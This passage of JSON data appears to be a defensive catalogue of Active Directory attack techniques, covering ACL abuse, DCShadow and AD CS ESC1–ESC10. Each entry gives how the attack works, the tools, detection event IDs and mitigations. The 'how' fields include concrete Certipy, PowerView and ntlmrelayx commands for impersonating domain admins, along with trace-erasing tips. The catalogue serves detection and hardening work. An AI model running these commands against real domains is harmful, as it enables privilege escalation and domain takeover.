Write)","aka":"GenericWrite on group / WriteProperty(member) / group tampering","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1098, T1078.002","cve":"","sev":"Critical","summary":"Write a group's member attribute to add an arbitrary account to a privileged group (e.g., Domain Admins).","how":"Add a controlled account to a group where you hold GenericAll/GenericWrite/WriteProperty(member) to inherit its privileges. A Tier0 group like Domain Admins means immediate domain takeover. Add with `Add-DomainGroupMember`, net/PowerShell, or `net rpc group addmem`, sometimes removing afterward to erase traces.","tools":"PowerView (Add-DomainGroupMember), net.exe, Active Directory PowerShellモジュール, BloodHound (AddMemberエッジ)","detect":"Monitor member-add events on privileged groups (4728 global / 4732 local / 4756 universal). Capture member attribute changes via 5136. Alert on add-then-remove patterns in a short window and unexpected additions to Tier0 groups.","events":"4728, 4732, 4756, 5136","mitigate":"Minimize privileged-group ACLs and restrict member write access. Real-time notify on protected-group changes. Operate privileged groups that can be emptied via JIT/PIM and eliminate standing members."},{"name":"ForceChangePassword","aka":"User-Force-Change-Password extended right","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1098, T1531","cve":"","sev":"High","summary":"An extended right to set a new password for a target user without knowing the current one. Account takeover.","how":"Force-set a new password on a user for which you hold the User-Force-Change-Password extended right (or GenericAll), then log on. Use `Set-DomainUserPassword`, impacket `changepasswd.py`, or `net rpc password`. Note that if the target is actively in use, the business impact makes it more likely to be noticed.","tools":"PowerView (Set-DomainUserPassword), impacket (net.py, changepasswd.py, smbpasswd), Rubeus (後続)","detect":"Monitor 4724 (password reset attempts) for cases where the actor and target are not in a normal administrative relationship. Correlate 4738 (account change) and pwdLastSet changes. Alert on resets originating from outside the help desk.","events":"4724, 4738","mitigate":"Inventory User-Force-Change-Password ACEs and minimize delegation. Put sensitive accounts in protected groups. Detect anomalous resets and reduce the impact of unilateral resets with MFA/passwordless."},{"name":"AddSelf (Self-Membership)","aka":"Self ACE / SELF write member / AddSelf edge","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1098","cve":"","sev":"High","summary":"A Self right to add yourself to a group. Abuse of delegated self-join configuration.","how":"A principal holding a Self-Membership write ACE on a group adds itself to that group to gain privileges. Shown as an AddSelf edge in BloodHound. Execute with `Add-DomainGroupMember -Identity <grp> -Members <self>`.","tools":"PowerView (Add-DomainGroupMember), net.exe, BloodHound (AddSelfエッジ)","detect":"Monitor 4728/4732/4756 for cases where the added principal and the target are identical. Detect self-additions to the member attribute via 5136.","events":"4728, 4732, 4756, 5136","mitigate":"Limit Self-Membership ACEs to the minimum necessary and never grant them on privileged groups. Periodically inventory group ACLs."},{"name":"Grant DCSync Rights (Replicating Directory Changes)","aka":"DCSync rights grant / DS-Replication-Get-Changes(-All) ACE addition","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1003.006, T1222.001","cve":"","sev":"Critical","summary":"Add replication-rights ACEs to the domain object to enable DCSync from an arbitrary account.","how":"A principal holding WriteDacl/GenericAll on the domain root grants a controlled account DS-Replication-Get-Changes (GUID 1131f6aa) and Get-Changes-All (1131f6ad). That account can then replicate/extract the NTLM hashes of all users / krbtgt. Automated granting is also possible with ntlmrelayx `--escalate-user` or dacledit.py.","tools":"PowerView (Add-DomainObjectAcl -Rights DCSync), impacket (dacledit.py, secretsdump.py), ntlmrelayx.py, mimikatz (lsadump::dcsync)","detect":"Monitor changes via 5136 where replication-related GUIDs are added to the domain object's DACL. Alert on replication via 4662 (GUID 1131f6aa/1131f6ad/1131f6ac) from a principal other than a DC.","events":"5136, 4662","mitigate":"Restrict replication rights to DCs/legitimate services only and inventory periodically. Enable SACL auditing on the domain object. Detect DRSUAPI replication from non-DCs via network/SIEM."},{"name":"AdminSDHolder / SDProp Abuse","aka":"AdminSDHolder container tampering / SDProp persistence","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1098, T1222.001","cve":"","sev":"Critical","summary":"Adding your own ACE to the AdminSDHolder ACL propagates to all protected accounts via SDProp every 60 minutes, achieving persistence.","how":"Append a GenericAll/ForceChangePassword ACE for a controlled account to the nTSecurityDescriptor under CN=AdminSDHolder,CN=System. SDProp (default 60 minutes) auto-propagates it to protected objects like Domain Admins, becoming a persistent backdoor that is re-granted even if removed.","tools":"PowerView (Add-DomainObjectAcl), ADSIEdit, impacket dacledit.py","detect":"Give top priority to monitoring nTSecurityDescriptor changes on the AdminSDHolder object via 5136. Periodically scan for unexpected ACEs appearing on protected accounts (ACL anomalies on adminCount=1 objects). Correlate 4780 (SDProp application).","events":"5136, 4780, 4662","mitigate":"Strictly restrict writes to AdminSDHolder and enable SACL auditing. Periodically compare against a baseline ACL and remediate deviations. Continuously audit dsHeuristics and the ACLs of adminCount objects."},{"name":"GPO Permission Abuse (WriteDacl/GenericWrite on GPO)","aka":"GPO abuse / SharpGPOAbuse / gPCFileSysPath tampering","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1484.001, T1053.005","cve":"","sev":"Critical","summary":"Write access to a GPO object lets an attacker push immediate tasks or scripts to every machine in the linked OU/domain, achieving code execution.","how":"A principal with WriteProperty/GenericWrite/WriteDacl on a GPO rewrites the GPT's SYSVOL files (e.g. scheduledtasks.xml) or attributes to plant immediate scheduled tasks, startup scripts, or local-admin additions. These execute on every computer/user under the linked OU.","tools":"SharpGPOAbuse, pyGPOAbuse, PowerView (Get-DomainGPO/New-GPOImmediateTask), BloodHound (GenericWrite on GPO)","detect":"Watch 5136 for GPC object changes; use FIM to detect tampering of GPT.ini/gPCMachineExtensionNames/Scheduled Tasks files on SYSVOL. Monitor for versionNumber spikes and suspicious immediate-task deployments. Correlate 4698 (task creation) on the endpoint side.","events":"5136, 4698, 5145(SYSVOL共有アクセス)","mitigate":"Minimize GPO delegation so only Tier0 can edit. Configure FIM on SYSVOL GPT files. Alert on GPLink/GPO edits to critical OUs (including Domain Controllers)."},{"name":"GPLink Abuse (WriteProperty on gPLink of OU/Domain)","aka":"GPLink edge / OU gPLink rewrite","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1484.001","cve":"","sev":"High","summary":"Write access to an OU/domain gPLink attribute lets an attacker link an attacker-controlled GPO to the target OU and take over its machines.","how":"A principal with write access to the gPLink attribute of an OU/site/domain links a self-made or existing malicious GPO to the target OU. The policy applies to child computers/users, leading to code execution or privilege escalation. Visualized via BloodHound's GPLink edge.","tools":"PowerView (Set-DomainObject gPLink), pyGPOAbuse, SharpGPOAbuse, BloodHound","detect":"Watch 5136 for gPLink attribute changes on OU/domain objects. Make unexpected GPO link additions — especially link changes to the Domain Controllers OU — the top-priority alert.","events":"5136","mitigate":"Minimize gPLink write delegation on OUs. Detect link changes to critical OUs in real time. Baseline GPO link configuration and remediate deviations."},{"name":"Resource-Based Constrained Delegation (RBCD) Write","aka":"AddAllowedToAct / msDS-AllowedToActOnBehalfOfOtherIdentity write","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1098, T1550.003","cve":"","sev":"Critical","summary":"Write the target computer's msDS-AllowedToActOnBehalfOf attribute, then use S4U2Self from an attacker-controlled account to impersonate any user.","how":"A principal with GenericWrite/GenericAll/WriteProperty (or WriteAccountRestrictions) on the target computer writes the SID of a controlled machine account (or a new one created via the default MachineAccountQuota of 10) into msDS-AllowedToActOnBehalfOfOtherIdentity. Then S4U2Self+S4U2Proxy obtains a CIFS/HOST service ticket to the target as Administrator, yielding local admin.","tools":"PowerView (Set-DomainRBCD), impacket (rbcd.py, addcomputer.py, getST.py), Rubeus (s4u), StandIn","detect":"Watch 5136 for changes to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute. Use 4741 (computer account creation) to catch MAQ abuse. Correlate 4769 for S4U2Proxy (0x40810000-family flags) or ticket requests from foreign-domain principals.","events":"5136, 4741, 4769, 4624","mitigate":"Set ms-DS-MachineAccountQuota to 0 to block machine creation by regular users. Minimize write delegation on computer objects. Alert on msDS-AllowedToActOnBehalfOf changes and eliminate GenericWrite on computers via Tiering."},{"name":"Shadow Credentials (msDS-KeyCredentialLink Write)","aka":"AddKeyCredentialLink / Whisker / pyWhisker / Key Trust abuse","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1098, T1649, T1556","cve":"","sev":"Critical","summary":"Add an attacker certificate key to the target's msDS-KeyCredentialLink to authenticate as the target via PKINIT and also recover its NTLM hash.","how":"A principal with GenericWrite/GenericAll/AddKeyCredentialLink on a target user/computer adds a self-made public key to the msDS-KeyCredentialLink attribute. Using the matching private key it performs PKINIT (certificate-based Kerberos) auth to obtain a TGT, then via UnPAC also retrieves the target's NTLM hash. No password change is required, making it highly stealthy.","tools":"Whisker, pyWhisker, Certipy (shadow auto), Rubeus (asktgt /certificate), ntlmrelayx (--shadow-credentials)","detect":"Watch 5136 for msDS-KeyCredentialLink attribute changes (SACL required). Correlate 4768 (certificate logon, with Certificate info) on PKINIT auth. Detect KeyCredential additions to unexpected objects.","events":"5136, 4768, 4662","mitigate":"Eliminate msDS-KeyCredentialLink write delegation and enable SACL auditing. Restrict key trust if AD CS/Key Trust is not needed. Inventory existing KeyCredentials via BloodHound/PowerShell and remove rogue entries."},{"name":"Targeted Kerberoasting (WriteSPN / servicePrincipalName Write)","aka":"WriteSPN edge / targetedKerberoast","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1558.003","cve":"","sev":"High","summary":"Temporarily assign an SPN to a target user, request a TGS, and crack the password offline.","how":"A principal with GenericWrite/GenericAll/WriteProperty (servicePrincipalName) on a target user assigns an arbitrary SPN, requests that user's TGS-REP to obtain an RC4-encrypted hash, and cracks the plaintext password with Hashcat. The SPN is removed afterward to erase traces.","tools":"PowerView (Set-DomainObject servicePrincipalName), Rubeus (kerberoast), targetedKerberoast.py, impacket GetUserSPNs.py, Hashcat","detect":"Watch 5136 for servicePrincipalName additions (especially SPNs on individual users). Use 4769 to detect spikes in RC4 (etype 0x17) TGS requests or access to honey SPNs. Correlate the SPN-add -> immediate 4769 -> delete pattern.","events":"5136, 4769, 4738","mitigate":"Use gMSA or 25+ character random passwords for service accounts. Eliminate servicePrincipalName write delegation. Disable RC4 (enforce AES) to raise Kerberoast resistance, and detect via honey-SPN accounts."},{"name":"Targeted AS-REP Roasting (WriteAccountRestrictions / UAC Write)","aka":"WriteAccountRestrictions edge / DONT_REQ_PREAUTH setting","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1558.004","cve":"","sev":"High","summary":"Set DONT_REQ_PREAUTH on the target's userAccountControl to disable Kerberos pre-auth, then crack the AS-REP offline.","how":"A principal with GenericWrite/GenericAll/WriteProperty (userAccountControl) or WriteAccountRestrictions on a target user sets the DONT_REQ_PREAUTH (0x400000) flag. Without pre-auth, the AS-REP is obtained and its RC4 portion cracked with Hashcat, then the flag is reverted. WriteAccountRestrictions can also rewrite RBCD-related attributes.","tools":"PowerView (Set-DomainObject userAccountControl), Rubeus (asreproast), impacket GetNPUsers.py, Hashcat","detect":"Watch 5136 for userAccountControl changes (DONT_REQ_PREAUTH bit). Detect 4738 (account change, pre-auth disabled). Correlate 4768 for AS-REQs without pre-auth (PreAuthType=0).","events":"5136, 4738, 4768","mitigate":"Eliminate userAccountControl write delegation. Periodically inventory DONT_REQ_PREAUTH accounts and remove permanent settings. Enforce AES to raise cracking difficulty and mandate strong passwords."},{"name":"SyncLAPSPassword","aka":"SyncLAPSPassword edge / LAPS attribute replication retrieval","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1003.006, T1555","cve":"","sev":"High","summary":"Retrieve LAPS passwords via directory replication using the combined GetChanges + ReadLAPS-equivalent rights.","how":"A principal holding both DS-Replication-Get-Changes and read access to the LAPS attribute (ms-Mcs-AdmPwd) retrieves LAPS passwords over DRSUAPI replication. Represented as the SyncLAPSPassword edge in BloodHound CE, it obtains local-admin credentials via a path close to DCSync.","tools":"impacket secretsdump.py(-just-dc系), PowerView, BloodHound (SyncLAPSPasswordエッジ)","detect":"Watch 4662 for the combination of replication-right exercise and LAPS attribute access. Detect replication from non-DCs and bulk retrieval of LAPS attributes.","events":"4662","mitigate":"Eliminate overlapping grants of replication rights and LAPS read access. Revoke replication rights from non-DCs. Audit LAPS attribute access."},{"name":"AD CS Template ACL Abuse (ESC4)","aka":"ESC4 / certificate template WriteDacl / GenericWrite","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1649, T1222.001","cve":"","sev":"Critical","summary":"Write access to a certificate template object lets an attacker alter it into a vulnerable configuration (e.g. ENROLLEE_SUPPLIES_SUBJECT), turning it into ESC1.","how":"A principal with WriteDacl/GenericWrite/GenericAll/WriteOwner on a pKICertificateTemplate object writes mspki-certificate-name-flag (arbitrary SubjectAltName), a Client Authentication EKU, and lowered issuance requirements to make it ESC1-equivalent. It then requests a certificate as Administrator and impersonates a domain admin via PKINIT. The original settings are restored after use.","tools":"Certipy (template edit/relback), PowerView, ADSIEdit, Certify, ntlmrelayx","detect":"Watch 5136 for attribute changes on pKICertificateTemplate objects (msPKI-Certificate-Name-Flag, msPKI-Enrollment-Flag, pKIExtendedKeyUsage, nTSecurityDescriptor). Correlate AD CS issuance logs (4886/4887) for anomalous SAN requests.","events":"5136, 4886, 4887, 4899(テンプレート更新)","mitigate":"Minimize certificate template ACLs so only Tier0 can edit. Audit and alert on template changes. Require manager approval for CA issuance and disable arbitrary SAN specification."},{"name":"AD CS CA Role Abuse (ESC7)","aka":"ESC7 / ManageCA / ManageCertificates rights","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1649","cve":"","sev":"Critical","summary":"ManageCA/ManageCertificates rights on the CA itself allow abusing certificate issuance by enabling vulnerable templates or approving failed requests.","how":"A principal with ManageCA (CA administrator) rights on the CA object/service enables the SubjectAltName extension (EDITF_ATTRIBUTESUBJECTALTNAME2) to reach ESC6, or with ManageCertificates (certificate manager) rights approves pending/failed certificate requests. This yields a certificate with an arbitrary SAN and escalates to domain admin.","tools":"Certipy (ca -add-officer/-enable-template/-issue), PSPKI, Certify","detect":"Watch for CA configuration changes (EDITF_ATTRIBUTESUBJECTALTNAME2) and anomalous certificate-manager approvals. Correlate suspicious approvals via 4890/4882 (CA permission/config changes) and 4887 (certificate issuance).","events":"4882, 4885, 4887, 4890","mitigate":"Strictly control ManageCA/ManageCertificates rights and limit to Tier0. Disable EDITF_ATTRIBUTESUBJECTALTNAME2. Enable auditing of CA configuration/issuance and minimize certificate-manager approvals."},{"name":"OU/Container ACL Abuse (Inheritance)","aka":"WriteDacl/GenericAll on OU / inherited ACE abuse","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1222.001, T1098","cve":"","sev":"High","summary":"Write access to an OU/container lets an attacker set inherited ACEs to control all child objects, or manipulate child objects directly.","how":"A principal with WriteDacl/GenericAll on an OU/container adds an inheritable ACE (CONTAINER_INHERIT) to propagate GenericAll to all child users/computers. Alternatively it combines gPLink rewriting or LAPS attribute delegation to seize child machines. Delegation misconfigurations give it broad impact.","tools":"PowerView (Add-DomainObjectAcl -Inheritance), impacket dacledit.py, BloodHound","detect":"Watch 5136 for nTSecurityDescriptor changes on OUs/containers, especially inherited-ACE additions. Periodically scan whether unexpected inherited permissions have propagated to child objects.","events":"5136, 4662","mitigate":"Design OU delegation with least privilege and eliminate WriteDacl. Periodically inventory inherited ACEs. Baseline ACLs of the OU structure (including Tier0) and detect deviations."},{"name":"Logon Script / scriptPath Write","aka":"GenericWrite -> scriptPath tampering / logon script abuse","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1037.003, T1098","cve":"","sev":"Medium","summary":"Rewrite a user's scriptPath (or profilePath) attribute to run an arbitrary script at logon.","how":"A principal with GenericWrite/GenericAll on a user rewrites the scriptPath attribute to an attacker-controlled script (e.g. on NETLOGON). When the target next logs on, code executes in their context. UNC rewrites of profilePath/homeDirectory are also used to coerce NTLM authentication.","tools":"PowerView (Set-DomainObject scriptPath), ADSIEdit, ntlmrelayx(強制認証連携)","detect":"Watch 5136 for scriptPath/profilePath/homeDirectory attribute changes. Use FIM to detect suspicious script additions on NETLOGON/SYSVOL. Correlate anomalous post-logon processes (4688).","events":"5136, 4688, 5145","mitigate":"Eliminate GenericWrite delegation on user objects. Audit scriptPath changes. Protect logon-script storage locations with FIM and restrict execution."},{"name":"AllExtendedRights","aka":"All Extended Rights / DS-Control-Access (all extended rights)","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1098, T1003.006","cve":"","sev":"High","summary":"All extended rights over a target. Enables comprehensive extended operations such as ForceChangePassword, DCSync, and LAPS/gMSA read.","how":"A principal with AllExtendedRights can exercise every applicable extended right depending on the target: ForceChangePassword (user), DS-Replication-Get-Changes family (domain = DCSync), LAPS/gMSA password read, and so on. Shown as BloodHound's AllExtendedRights edge, it branches into the optimal follow-on attack per target.","tools":"PowerView, impacket (secretsdump.py, changepasswd.py), mimikatz, BloodHound","detect":"Watch 4662 for extended-right exercise keyed to the target GUID. Inventory principals holding AllExtendedRights ACEs and correlate follow-on events such as ForceChangePassword (4724) and replication (4662).","events":"4662, 4724","mitigate":"Remove AllExtendedRights ACEs and replace with specific least-privilege rights. Eliminate grants on sensitive objects (domain/DC/protected accounts) and audit periodically."},{"name":"DCShadow","aka":"mimikatz lsadump::dcshadow / rogue DC registration","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1207","cve":"","sev":"Critical","summary":"With high-privilege ACLs (replication/write rights on the domain/Configuration), temporarily register a rogue DC and tamper with arbitrary object attributes via replication.","how":"A principal with replication rights on the domain/Configuration partition and object-creation rights (e.g. DS-Install-Replica) temporarily registers its own host as a DC and rewrites sidHistory, primaryGroupID, ACLs, etc. via a replication push. It readily evades normal change logs and is used for stealthy persistence and privilege escalation.","tools":"mimikatz (lsadump::dcshadow /push), impacket(一部)","detect":"Watch for temporary nTDSDSA/server object creation/deletion in the Configuration partition (5137/5141). Detect replication from unexpected hosts (4662) and short-lived DC registrations.","events":"4662, 5137, 5141, 4928/4929","mitigate":"Limit replication and Configuration write rights to DCs/Enterprise Admins. Alert on anomalous DC registrations. Strictly control Tier0 privileges to eliminate the prerequisites for DCShadow."},{"name":"SID History Injection via Write","aka":"sIDHistory write / SID History injection via DCShadow","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1134.005","cve":"","sev":"High","summary":"Writing to the sIDHistory attribute (typically via DCShadow/replication) injects a privileged group SID that gets inherited into the token.","how":"Normally requires LSA/replication privileges, but a principal with DCShadow or replication-write rights injects a SID such as Domain Admins (RID 512) into the target account's sIDHistory. At logon that SID is included in the token, granting privileges without actual group membership — a persistence technique.","tools":"mimikatz (sid::add, lsadump::dcshadow), DSInternals (Add-ADDBSidHistory)","detect":"Monitor sIDHistory attribute changes via 5136. Periodically scan for anomalous accounts whose sIDHistory contains privileged RIDs (e.g., 512). Correlate DCShadow artifacts (5137/5141).","events":"5136, 4765/4766(SID History追加/失敗)","mitigate":"Inventory accounts with sIDHistory and remove unneeded entries. Enable SID filtering. After migration completes, clear sIDHistory and tightly control replication rights."},{"name":"ESC1 - Misconfigured Certificate Templates (Enrollee Supplies Subject)","aka":"Abuse of SAN-specifiable templates","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649","cve":"","sev":"Critical","summary":"When a template has the Client Authentication EKU and lets the enrollee supply an arbitrary Subject Alternative Name (SAN), an attacker issues a certificate embedding an arbitrary user's (e.g., Domain Admin) UPN to impersonate them.","how":"Prerequisites: the template has CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (msPKI-Certificate-Name-Flag), includes one of the Client Auth/PKINIT/Smartcard Logon/Any Purpose EKUs, grants Enroll rights to low-privileged users, and requires no manager approval. Identify ESC1 templates with `Certipy find -vulnerable`, then issue with `certipy req -ca <CA> -template <tmpl> -upn administrator@domain.local` specifying the DA UPN in the SAN, and run `certipy auth -pfx admin.pfx` with the resulting PFX to obtain a TGT/NT hash.","tools":"Certipy (find/req/auth), Certify.exe request /altname, Rubeus asktgt /certificate, openssl","detect":"On the CA, monitor events 4886 (certificate request)/4887 (certificate issued) for cases where the Subject and requester account mismatch (a low-privileged requester but administrator in the SAN). Cross-check the requesting template name against the SAN UPN domain. Correlate PKINIT-derived 4768 (encryption type / Certificate Information field).","events":"4886, 4887, 4768(PKINIT), 4624","mitigate":"Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT from the template and build the Subject from AD instead. Always require manager approval (CA Certificate Manager Approval) on templates with Client Auth EKUs and minimize Enroll rights. Continuously inventory using the `certipy find` vulnerability report."},{"name":"ESC2 - Any Purpose EKU / No EKU (SubCA) Template","aka":"Any Purpose EKU abuse","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649","cve":"","sev":"High","summary":"When a template's EKU is Any Purpose (2.5.29.37.0) or has no EKU (SubCA-equivalent), issued certificates can be used for any purpose (including client authentication), enabling impersonation or further certificate signing.","how":"Prerequisites: the template has the Any Purpose EKU or an empty EKU, with Enroll rights for low-privileged users. Enroll as in ESC1; even when SAN cannot be specified, the certificate can be used for authentication, signing, or any purpose. If SAN can be specified, perform UPN impersonation as in ESC1; if not, repurpose the obtained certificate for other attacks (signing).","tools":"Certipy req, Certify request, Rubeus","detect":"Detect issuance from templates with Any Purpose/empty EKU via 4886/4887. In particular, monitor SubCA/general-purpose template enrollment by low-privileged accounts as anomalous.","events":"4886, 4887","mitigate":"Restrict template EKUs to the minimum required for the business (e.g., Client Authentication only), and remove Enroll rights on Any Purpose/empty-EKU templates or make manager approval mandatory."},{"name":"ESC3 - Enrollment Agent Template Abuse","aka":"Certificate Request Agent EKU abuse","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649","cve":"","sev":"High","summary":"Obtain an enrollment agent certificate from a template with the Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1), then use that agent authority to issue certificates on behalf of other users (e.g., DA) and impersonate them.","how":"Prerequisites: low-privileged Enroll rights on an Enrollment Agent EKU template, and a template that permits enroll-on-behalf-of. Steps: (1) obtain an Enrollment Agent certificate with `certipy req`, (2) issue a certificate on behalf of the target user with `certipy req -template User -on-behalf-of 'domain\\administrator' -pfx agent.pfx`, (3) authenticate with `certipy auth`.","tools":"Certipy (req -on-behalf-of), Certify request /onbehalfof /enrollcert","detect":"Correlate issuance of an Enrollment Agent certificate (4887) with subsequent on-behalf-of issuance (4886/4887 where requester and certificate Subject differ). On-behalf-of issuance is rare, so it is a high-signal indicator even in isolation.","events":"4886, 4887","mitigate":"Strictly limit issuance of Enrollment Agent EKU templates, and configure Enrollment Agent Restrictions on the CA (who may enroll on whose behalf, using which templates). Delete unneeded Enrollment Agent templates."},{"name":"ESC4 - Vulnerable Certificate Template Access Control","aka":"Template ACL rewrite","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649, T1222","cve":"","sev":"High","summary":"When a low-privileged user holds Write/WriteDacl/FullControl etc. over a certificate template object, they rewrite the template configuration to be ESC1-equivalent and then abuse it.","how":"Prerequisites: WriteOwner/WriteDacl/WriteProperty etc. over the template AD object (CN=...,CN=Certificate Templates,CN=Public Key Services). Convert to ESC1 with `certipy template -template <tmpl> -write-default-configuration` (adding ENROLLEE_SUPPLIES_SUBJECT, setting EKU to Client Auth, removing approval requirements), issue and authenticate as in ESC1, then restore the original configuration.","tools":"Certipy template (旧-save-old/-configuration), StandIn, PowerView Set-ADObject","detect":"Monitor changes to the template object (5136 directory service object change) for modifications to msPKI-Certificate-Name-Flag / pKIExtendedKeyUsage / msPKI-Enrollment-Flag. Enable SACL auditing in advance.","events":"5136, 4899(テンプレート更新), 4886, 4887","mitigate":"Review template DACLs and limit write rights to the PKI admin group only. Configure change auditing (SACL) on the Certificate Templates container and set up 5136 alerts."},{"name":"ESC5 - Vulnerable PKI Object Access Control","aka":"PKI object / CA server takeover","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649, T1222","cve":"","sev":"High","summary":"Abuse excessive rights over CA AD objects (pKIEnrollmentService, NTAuthCertificates), the CA server's computer object, or related AD containers to alter PKI-wide configuration or gain control of the CA.","how":"Prerequisites: write rights over objects under CN=Public Key Services (Enrollment Services, NTAuthCertificates, AIA/CDP) or the CA host computer object. Add an attacker CA certificate to NTAuthCertificates, or take over the CA computer via RBCD/shadow credentials and escalate to ESC7/Golden Certificate.","tools":"Certipy, PowerView, BloodHound, StandIn, Rubeus/Whisker(シャドウクレデンシャル)","detect":"Monitor changes (5136) to NTAuthCertificates and Enrollment Services objects, and modifications to msDS-KeyCredentialLink/msDS-AllowedToActOnBehalf on the CA computer object. Periodically audit reachability with BloodHound.","events":"5136, 4662, 4742(コンピュータ変更)","mitigate":"Restrict rights under Public Key Services and on the CA host to Tier0 admins. Isolate CA servers as Tier0 assets, and strictly limit delegation (RBCD) and KeyCredential writes."},{"name":"ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Flag","aka":"CA-level arbitrary-SAN flag","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649","cve":"","sev":"Critical","summary":"When the CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set, the SAN can be arbitrarily specified via request attributes regardless of template settings, enabling impersonation with any authentication template.","how":"Prerequisites: EDITF_ATTRIBUTESUBJECTALTNAME2 enabled in the CA policy module (check with `certutil -getreg policy\\EditFlags`). Request any Client Auth template with a SAN attribute, e.g., `certipy req -upn administrator@domain.local`, obtaining a DA impersonation certificate and authenticating. Note that even after the CVE-2022-26923 patch, the SAN takes precedence when this flag is enabled.","tools":"Certipy req (-upn/-sid), Certify request /altname","detect":"Periodically audit the CA's EditFlags. Detect issuance of certificates with a SAN (UPN) different from the requester via 4887. `certipy find` flags this as ESC6.","events":"4887, 4886, 4768","mitigate":"Disable the flag with `certutil -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2` and restart the CA (AD CS) service. Periodically compare CA registry configuration against a baseline."},{"name":"ESC7 - Vulnerable CA Access Control (ManageCA / ManageCertificates)","aka":"CA privilege escalation","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649, T1222","cve":"","sev":"Critical","summary":"When a low-privileged user holds ManageCA (CA administrator) or ManageCertificates (certificate manager) rights on the CA, they seize control of certificate issuance by changing CA flags, approving failed requests, enabling templates, etc.","how":"Prerequisites: ManageCA/ManageCertificates granted in the CA security settings. Method (A): use ManageCA to enable EDITF_ATTRIBUTESUBJECTALTNAME2 and convert to ESC6. Method (B): request the SubCA template → have it denied, then force-approve the failed request with ManageCertificates via `certipy ca -issue-request <ID>` to obtain the certificate.","tools":"Certipy ca (-add-officer/-enable-template/-issue-request), Certify, PSPKI","detect":"Monitor changes to CA role assignments, correlation where a denied request (4888 = request denied) is later issued (4887) under the same RequestID, and force-approval of failed requests via ManageCertificates. Detect CA officer additions (4890/4892 CA configuration change).","events":"4882(CAセキュリティ変更), 4885/4890/4892(CA構成/役割変更), 4887","mitigate":"Grant ManageCA/ManageCertificates only to a minimal set of PKI admins. Audit CA rights changes and disable dangerous templates such as SubCA. Periodically inventory CA officers with `certipy find`/PSPKI."},{"name":"ESC8 - NTLM Relay to AD CS HTTP Web Enrollment","aka":"PetitPotam + Web Enrollment relay","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1557, T1187, T1649","cve":"","sev":"Critical","summary":"When the CA's Web Enrollment endpoint (certsrv, /certsrv/certfnsh.asp) accepts HTTP+NTLM, relay the authentication of a victim machine (especially a DC) via NTLM to have a client-auth certificate issued for that machine account.","how":"Prerequisites: HTTP Web Enrollment enabled and EPA (Extended Protection) not configured. Start a relay server with `certipy relay -target http://<ca>/certsrv`, coerce DC$ authentication via PetitPotam/PrinterBug/DFSCoerce etc., and relay to obtain a DC$ certificate. Use the certificate with `certipy auth` to get DC$'s TGT → escalate to DCSync.","tools":"Certipy relay, ntlmrelayx -t http://ca/certsrv/certfnsh.asp, PetitPotam, Coercer, PrinterBug, DFSCoerce","detect":"Anomalous machine-account authentication in Web Enrollment (IIS) access logs. DomainController/Machine certificate issuance to computer accounts via 4886/4887. Mismatch between source IP and the expected host, and coercion via MS-EFSR/MS-RPRN.","events":"4886, 4887, 4768, IISログ(certsrv), 5145(EFSRPC/spoolss)","mitigate":"On HTTP Web Enrollment, enforce EPA (Extended Protection for Authentication), channel binding/HTTPS, and disable NTLM (Kerberos/Negotiate only). Remove the Web Enrollment role if unneeded. Apply coercion countermeasures for PetitPotam etc. (patches, RPC filters)."},{"name":"ESC9 - No Security Extension (szOID_NTDS_CA_SECURITY_EXT)","aka":"CT_FLAG_NO_SECURITY_EXTENSION abuse","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649","cve":"","sev":"High","summary":"When a template has CT_FLAG_NO_SECURITY_EXTENSION set so the certificate lacks the SID-binding security extension, impersonation via UPN rewrite (similar to ESC10) is possible when StrongCertificateBindingEnforcement is compatibility (1)/disabled (0). Under full enforcement (2), certificates lacking the SID extension are rejected and this fails.","how":"Prerequisites: NO_SECURITY_EXTENSION in the target template's msPKI-Enrollment-Flag, plus UPN-rewrite rights (GenericWrite) over the victim account. Rewrite the victim account's userPrincipalName to administrator → enroll the NO_SECURITY_EXTENSION template as that account → revert the UPN → authenticate as administrator with the obtained certificate. Because SID binding is absent, UPN mapping grants the escalation.","tools":"Certipy (account update -upn, req, auth), PowerView Set-ADObject","detect":"Frequent changes to account userPrincipalName (5136), and authentication with certificates lacking the SID security extension. Monitor mismatches between the Certificate Information field and the account SID via 4768/4769.","events":"5136, 4886, 4887, 4768","mitigate":"Remove the NO_SECURITY_EXTENSION flag from templates and require the SID security extension. Apply KB5014754 enforcement mode (StrongCertificateBindingEnforcement=2). Restrict UPN-rewrite rights (GenericWrite)."},{"name":"ESC10 - Weak Certificate Mapping","aka":"UPN mapping abuse / weakened StrongCertificateBindingEnforcement","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649","cve":"","sev":"High","summary":"When the registry StrongCertificateBindingEnforcement=0 (Kerberos) or 